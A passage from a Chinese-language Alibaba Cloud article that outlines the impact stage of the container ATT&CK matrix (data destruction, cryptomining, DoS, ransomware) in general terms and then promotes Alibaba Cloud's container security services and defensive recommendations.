![11K8s集群.png](https://ucc.alicdn.com/pic/developer-ecology/5d80969ed11a4bf3acab6b27457579a1.png)

## 9. Impact/影响

### 9.1 破坏系统及数据

以破坏为目的的攻击者可能会停止或禁用系统上的服务、删除某些核心文件及数据以使合法用户无法使用这些服务。停止关键服务可能会抑制防御方对事件的响应，并有利于攻击者的最终目标。

### 9.2 劫持资源

常见于攻击者通过自动化脚本入侵并植入挖矿程序进行获利。

### 9.3 DoS

攻击者会发起DoS攻击，影响系统的可用性。容器化场景中的DoS攻击包括对业务层、K8s API层的攻击以及对Pod资源的抢占。

### 9.4 加密勒索

在传统主机安全场景中，有经验的攻击者会找到企业核心数据并对其进行加密勒索。由于容器场景的资源弹性较大，且后端数据的产生、存储、销毁链路往往通过云服务API实现，而非在用户磁盘上进行，企业可以通过云原生的快照与备份服务来实现资产备份，避免核心数据丢失。

# 三、阿里云容器安全解决方案

阿里云容器服务（ACK）提供高性能可伸缩的容器应用管理服务，支持企业级Kubernetes容器化应用的生命周期管理。阿里云容器镜像服务（ACR）是云原生时代的重要基础设施之一，支撑阿里巴巴经济体容器镜像托管，分钟级分发万节点。自2015年起，先后服务了数千家企业，托管了数 PB容器镜像数据，支撑月均镜像拉取数亿次。

为了帮助云上客户更好的做好容器安全建设，阿里云重点关注容器构建、容器部署和容器运行三大生命周期阶段，结合容器ATT&CK攻防矩阵，提供自动化的容器安全检测和响应能力；同时联合阿里云原生容器安全服务，共同面向客户推出云上容器安全一体化方案，助力企业容器化进程。

借助云安全中心，阿里云可以为客户提供自动化的安全编排与响应能力，全面提升容器安全易用性；同时为容器镜像提供漏洞扫描和修复，并支持整合在容器构建流程中，避免部署存在风险的容器；对于运行时的容器被植入 Webshell、挖矿病毒等场景，自动化将隔离恶意样本，并通过联动云防火墙，针对存在漏洞的容器，提供虚拟补丁的能力，缓解安全风险。

# 四、总结

理解容器ATT&CK攻防矩阵是构建容器安全能力的第一步，除了上述涉及的能力和措施外，阿里云安全团队建议用户在实施容器化过程中需要遵循以下几点安全规范，从不同角度缓解容器化带来的风险：
1、在应用生命周期中关注您的镜像，容器，主机，容器管理平台以及相关云服务的安全性，了解潜在风险以及如何保护整体容器环境的运行免受危害。
2、收集并妥善保管K8s集群、第三方CI组件以及云服务的API通信凭证，避免因人工误操作导致的AK泄露。
3、由于容器应用生态涉及到的中间件较多，系统管理者需要关注这些中间件的漏洞披露情况并及时做好脆弱性管理和补丁升级工作。

最后，针对上述容器ATT&CK攻防矩阵，阿里云推出容器安全运行检测清单，企业可以根据下图中所展示的内容检测自己的容器安全水位，以便及时发现问题及时修复。

![image-20230130094112788](https://ucc.alicdn.com/pic/developer-ecology/aa970b600dab4a7fb5a3e0879f67e7a3.jpg)